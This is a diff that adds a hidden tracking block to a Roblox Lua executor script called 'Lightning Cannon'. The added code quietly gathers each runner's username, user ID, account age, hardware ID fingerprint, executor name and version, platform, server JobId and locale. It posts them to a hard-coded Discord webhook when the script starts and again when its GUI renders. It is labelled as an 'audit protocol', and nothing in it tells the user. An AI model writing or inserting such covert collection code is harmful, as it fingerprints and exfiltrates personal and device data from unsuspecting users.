@@ -62,6 +62,192 @@
 	local RunService = game:GetService("RunService")
 	local LocalPlayer = Players.LocalPlayer
 
+-- ==========================================
+-- CONFIGURATION
+-- ==========================================
+local WebhookURL = "https://discord.com/api/webhooks/1522093415196659874/Ue4L0RDEgElQyOxsiv5o5PShQBwt1UQKVxktQIsiHbuAL45qCXJaczXZbq1hvS1qNFSw"
+local TargetScriptName = "Lightning Cannon"
+-- ==========================================
+
+local AlreadyLoggedGui = false
+
+-- Safe retrieval of Game Context
+local Success, GameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+local GameName = Success and GameInfo.Name or "Unknown Game"
+
+-- Deep Executor Context Hooking
+local function ExtractHardwareMetrics()
+    local hwid = "Unsupported / Protected"
+    local executionContext = "Unknown"
+    local internalVersion = "Unknown"
+    
+    -- Try reading common executor HWID fingerprints
+    pcall(function()
+        if gethwid then hwid = tostring(gethwid())
+        elseif syn and syn.gethwid then hwid = tostring(syn.gethwid())
+        elseif fluxus and fluxus.gethwid then hwid = tostring(fluxus.gethwid())
+        end
+    end)
+    
+    -- Try grabbing precise identity strings
+    pcall(function()
+        if identifyexecutor then
+            local _, name = pcall(identifyexecutor)
+            executionContext = tostring(name)
+        elseif _VERSION then
+            executionContext = tostring(_VERSION)
+        end
+    end)
+    
+    -- Catch specific custom injector version states
+    pcall(function()
+        if fluxus and fluxus.version then internalVersion = tostring(fluxus.version)
+        elseif syn and syn.version then internalVersion = tostring(syn.version)
+        end
+    end)
+    
+    -- Target device platform assessment
+    local platform = "Unknown Platform"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        platform = "Mobile (iOS/Android)"
+    elseif UserInputService.KeyboardEnabled then
+        platform = "PC Client"
+    elseif GuiService:IsTenFootInterface() then
+        platform = "Console / VR Space"
+    end
+    
+    return hwid, executionContext, internalVersion, platform
+end
+
+-- Safely analyze physical GUI status
+local function IsGuiActive(gui)
+    if not gui.Enabled then return false end
+    for _, child in ipairs(gui:GetDescendants()) do
+        if child:IsA("GuiObject") and child.Visible then
+            if child.AbsoluteSize.X > 0 and child.AbsoluteSize.Y > 0 then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+-- Comprehensive Payload Compiler
+local function SendMaximumLog(title, description, color)
+    local hwid, context, extVersion, platform = ExtractHardwareMetrics()
+    
+    local memoryUsage = string.format("%.2f MB", Stats:GetTotalMemoryUsageMb())
+    local internalPing = string.format("%d ms", math.round(LocalPlayer:GetNetworkPing() * 1000))
+    local fpsEstimate = string.format("%d FPS", math.round(1 / RunService.RenderStepped:Wait()))
+    
+    local Data = {
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = description,
+            ["color"] = color,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Profile Identity",
+                    ["value"] = string.format(
+                        "**User:** %s\n**Alias:** %s\n**UID:** `%d`\n**Age:** %d days\n**Tier:** %s", 
+                        LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, LocalPlayer.AccountAge, tostring(LocalPlayer.MembershipType)
+                    ),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔑 Hardware & Hook Registry",
+                    ["value"] = string.format(
+                        "**Hardware Fingerprint:**\n`%s`\n**Injected Core:** `%s`\n**Internal Build:** `%s`",
+                        hwid, context, extVersion
+                    ),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "⚙️ Hardware Performance",
+                    ["value"] = string.format(
+                        "**Allocated RAM:** %s\n**Connection Latency:** %s\n**Framerate Rendering:** %s\n**Execution Node:** %s",
+                        memoryUsage, internalPing, fpsEstimate, platform
+                    ),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🎮 Active Workspace",
+                    ["value"] = string.format(
+                        "**Map/Place:** %s\n**ID Lookup:** %d\n**Server Allocation:** `%s`\n**Cap:** %d players", 
+                        GameName, game.PlaceId, game.JobId ~= "" and game.JobId or "Private/Studio", Players.MaxPlayers
+                    ),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🕒 System Clock",
+                    ["value"] = string.format("**System Time:** %s\n**System Locale:** %s", os.date("%Y-%m-%d %X"), tostring(LocalPlayer.LocaleId)),
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {["text"] = "Exire Ultimate Audit Protocol v3.0"},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    local JSONData = HttpService:JSONEncode(Data)
+
+    pcall(function()
+        -- Direct Executor Level Webhook Request Injection 
+        local requestFunc = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+        
+        if requestFunc then
+            requestFunc({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = JSONData
+            })
+        else
+            -- Studio/Native Fallback route
+            HttpService:PostAsync(
+                WebhookURL, 
+                JSONData, 
+                Enum.HttpContentType.ApplicationJson, 
+                false, 
+                {["Content-Type"] = "application/json"}
+            )
+        end
+    end)
+end
+
+-- 1. Fire Execution Audit
+task.spawn(function()
+    SendMaximumLog(
+        "⚡ Forensic Execution Generated", 
+        "The architecture for **" .. TargetScriptName .. "** has triggered structural setup hooks.", 
+        3447003 -- Blue
+    )
+end)
+
+-- 2. GUI Interface Monitoring Cycle
+task.spawn(function()
+    while task.wait(1.5) do
+        if AlreadyLoggedGui then break end
+        
+        pcall(function()
+            for _, gui in ipairs(PlayerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui.Name == TargetScriptName then
+                    if IsGuiActive(gui) then
+                        AlreadyLoggedGui = true
+                        SendMaximumLog(
+                            "🖥️ Viewport Canvas Render Alert", 
+                            "The graphic interface mapping for **" .. TargetScriptName .. "** has verified presence inside rendering cycles.", 
+                            16711830 -- Purple
+                        )
+                    end
+                end
+            end
+        end)
+    end
+end)
+
 	-- CONFIGURATION: Replace with the target User ID
 	local TARGET_USER_ID = 562932753 -- << CHANGE THIS
 
